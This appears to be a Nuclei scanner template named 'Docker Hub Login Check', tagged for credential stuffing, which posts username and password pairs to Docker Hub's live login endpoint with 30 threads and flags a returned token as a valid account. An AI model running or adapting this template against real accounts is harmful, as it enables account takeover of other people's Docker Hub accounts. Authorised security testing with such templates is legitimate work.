http:
- attack: pitchfork
  extractors:
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - part: body
    type: word
    words:
    - token
  - part: header
    type: word
    words:
    - 'Set-Cookie: token='
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST https://hub.docker.com/v2/users/login HTTP/1.1\nHost: hub.docker.com\nContent-Type:\
    \ application/json\n\n{\n  \"username\": \"{{username}}\",\n  \"password\": \"\
    {{password}}\"\n}\n"
  threads: 30
id: docker-hub-login-check
info:
  author: parthmalhotra,pdresearch
  description: Checks for a valid Docker Hub account.
  metadata:
    max-request: 1
  name: Docker Hub Login Check
  reference:
  - https://owasp.org/www-community/attacks/Credential_stuffing
  severity: critical
  tags: creds-stuffing,login-check,cloud,docker,vuln
self-contained: true
